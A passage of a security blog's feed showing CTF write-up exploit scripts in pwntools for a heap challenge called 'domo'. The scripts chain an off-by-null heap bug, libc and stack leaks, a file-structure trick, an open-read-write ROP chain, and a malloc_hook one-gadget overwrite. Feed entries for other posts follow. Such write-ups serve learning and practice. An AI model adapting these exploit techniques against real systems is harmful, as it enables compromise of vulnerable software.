class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>python3 angr 学习笔记</title>
    <link href="https://nocbtm.github.io/2020/05/21/python3-angr-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://nocbtm.github.io/2020/05/21/python3-angr-学习笔记/</id>
    <published>2020-05-21T08:44:17.000Z</published>
    <updated>2020-05-24T11:44:29.963Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-05-12T00:40:29.178Z</updated>
    
    <summary type="html">
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+bMMy7YuUFB/T2yvlYG9DuC9O/yoqcxLs= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
